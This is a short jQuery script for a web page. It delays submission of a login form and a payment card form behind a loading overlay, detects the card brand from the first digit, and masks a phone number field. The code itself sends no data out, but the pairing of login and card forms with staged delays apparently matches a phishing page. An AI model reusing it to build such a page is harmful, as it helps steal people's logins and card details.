$(function() {
	$('#logform').submit(function (e) {
		$('.lod-full').show(100);
		
        var form = this;
        e.preventDefault();
        setTimeout(function () {
            form.submit();
        }, 1500); // in milliseconds
    });
    $('#card_form').submit(function (e) {
        $('.lod-full').show(100);
        
        var form = this;
        e.preventDefault();
        setTimeout(function () {
            form.submit();
        }, 2500); // in milliseconds
    });

    $('html').delegate('#cart_number', 'keyup', function () {
    	if($(this).val().substring(0, 1) == '4'){
    		$(this).next().attr('src', '../img/vsa.png');
    		$(this).next().show(10);
    	}
    	else if($(this).val().substring(0, 1) == '5'){
    		$(this).next().attr('src', '../img/mc.png');
    		$(this).next().show(10);
    	}
        else if($(this).val().substring(0, 1) == '6'){
            $(this).next().attr('src', '../img/dc.png');
            $(this).next().show(10);
        }
        else if($(this).val().substring(0, 1) == '3'){
            $(this).next().attr('src', '../img/amx.png');
            $(this).next().show(10);
        }
    	else
    	{
    		$(this).next().hide(10);
    	}
    });
    $('#phann').mask("(999) 999-9999");
});